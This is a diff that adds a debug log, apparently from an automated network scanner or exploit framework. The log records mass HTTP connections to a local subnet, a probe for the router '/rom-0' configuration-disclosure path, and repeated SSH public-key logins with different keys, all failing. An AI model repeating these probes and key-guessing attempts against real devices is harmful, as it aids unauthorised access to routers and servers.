@@ -1,0 +1,700 @@
+2017-04-10 13:12:45,547 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,583 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,633 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,634 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,635 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,640 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,643 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,683 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,719 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,857 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,883 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,886 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,886 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,887 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,896 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,897 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,925 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,935 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,936 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,994 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,995 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:45,996 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,000 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,000 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,003 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,004 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,005 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,009 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,009 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,013 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,014 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,016 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,022 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,024 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,025 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,025 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,028 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,029 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,030 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,032 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,033 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,035 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,037 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,038 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,039 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,040 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,041 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,042 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,043 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,045 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,046 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,047 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,048 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,049 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,051 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,052 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,053 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,054 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,055 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,056 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,057 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,059 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,172 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,173 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,174 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,176 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,178 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,259 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,260 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,261 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,262 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,268 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,268 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,271 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,271 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,273 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,274 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,275 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,278 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,279 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,280 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,282 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,283 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,286 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:12:46,287 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,223 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,225 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,227 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,229 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,231 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,234 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,234 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,236 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,238 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,240 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,241 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,243 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,244 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,247 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,250 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,251 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,252 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,256 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,257 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,258 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,259 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,261 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,267 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,267 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,268 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,268 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,275 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,278 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,279 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,282 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,283 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,284 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,286 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,290 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,291 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,291 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,294 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,295 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,296 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,299 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,300 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,302 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,304 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,311 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,315 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,317 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,319 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,322 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,326 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,330 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,331 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,333 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,334 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,335 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,336 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,338 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,339 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,340 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,341 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,342 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,343 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,344 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,398 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,398 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,402 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,402 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,404 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,405 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,407 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,521 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,523 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,524 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,525 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,526 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,527 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,532 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,532 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,532 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,537 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,539 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,539 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,539 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,544 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,544 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:26,545 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.0
+2017-04-10 13:14:54,207 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:14:54,209 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:14:54,401 DEBUG paramiko.transport       starting thread (client mode): 0x45262850L
+2017-04-10 13:14:54,401 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:54,438 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "HEAD /rom-0 HTTP/1.1" 404 0
+2017-04-10 13:14:54,450 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:14:54,478 DEBUG requests.packages.urllib3.connectionpool       Starting new HTTP connection (1): 192.168.1.248
+2017-04-10 13:14:54,494 DEBUG requests.packages.urllib3.connectionpool       http://192.168.1.248:80 "GET / HTTP/1.1" 200 2401
+2017-04-10 13:14:54,531 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:54,531 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:54,538 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:54,539 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:54,539 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:54,539 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:54,539 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:54,769 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:54,769 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:54,802 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:54,802 DEBUG paramiko.transport       Trying SSH key 22c8a9c301a01731a543f2704a1c55f6
+2017-04-10 13:14:54,982 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:55,044 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:55,145 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:55,188 DEBUG paramiko.transport       starting thread (client mode): 0x45262b10L
+2017-04-10 13:14:55,189 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:55,273 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:55,274 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:55,282 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:55,282 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:55,282 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:55,282 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:55,283 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:55,544 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:55,544 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:55,559 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:55,559 DEBUG paramiko.transport       Trying SSH key e44d3e11db3f06be3140d8fe038e468b
+2017-04-10 13:14:55,563 DEBUG paramiko.transport       userauth is OK
+2017-04-10 13:14:55,598 INFO paramiko.transport       Authentication (publickey) failed.
+2017-04-10 13:14:55,698 DEBUG paramiko.transport       EOF in transport thread
+2017-04-10 13:14:55,740 DEBUG paramiko.transport       starting thread (client mode): 0x3034dd50L
+2017-04-10 13:14:55,741 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.0.0
+2017-04-10 13:14:55,827 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_6.7p1 Debian-5
+2017-04-10 13:14:55,827 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_6.7p1)
+2017-04-10 13:14:55,832 DEBUG paramiko.transport       kex algos:[u'curve25519-sha256@libssh.org', u'ecdh-sha2-nistp256', u'ecdh-sha2-nistp384', u'ecdh-sha2-nistp521', u'diffie-hellman-group-exchange-sha256', u'diffie-hellman-group14-sha1'] server key:[u'ssh-rsa', u'ssh-dss', u'ecdsa-sha2-nistp256', u'ssh-ed25519'] client encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] server encrypt:[u'aes128-ctr', u'aes192-ctr', u'aes256-ctr', u'aes128-gcm@openssh.com', u'aes256-gcm@openssh.com', u'chacha20-poly1305@openssh.com'] client mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] server mac:[u'umac-64-etm@openssh.com', u'umac-128-etm@openssh.com', u'hmac-sha2-256-etm@openssh.com', u'hmac-sha2-512-etm@openssh.com', u'hmac-sha1-etm@openssh.com', u'umac-64@openssh.com', u'umac-128@openssh.com', u'hmac-sha2-256', u'hmac-sha2-512', u'hmac-sha1'] client compress:[u'none', u'zlib@openssh.com'] server compress:[u'none', u'zlib@openssh.com'] client lang:[u''] server lang:[u''] kex follows?False
+2017-04-10 13:14:55,832 DEBUG paramiko.transport       Kex agreed: diffie-hellman-group14-sha1
+2017-04-10 13:14:55,832 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2017-04-10 13:14:55,832 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2017-04-10 13:14:55,832 DEBUG paramiko.transport       Compression agreed: none
+2017-04-10 13:14:56,065 DEBUG paramiko.transport       kex engine KexGroup14 specified hash_algo <built-in function openssl_sha1>
+2017-04-10 13:14:56,065 DEBUG paramiko.transport       Switch to new keys ...
+2017-04-10 13:14:56,072 DEBUG paramiko.transport       Adding ssh-rsa host key for 192.168.1.248: 012f78625f62a68a719c5878d8dfac1e
+2017-04-10 13:14:56,073 DEBUG paramiko.transport       Trying SSH key 049bf5dede27105ab88dab79cd17e857
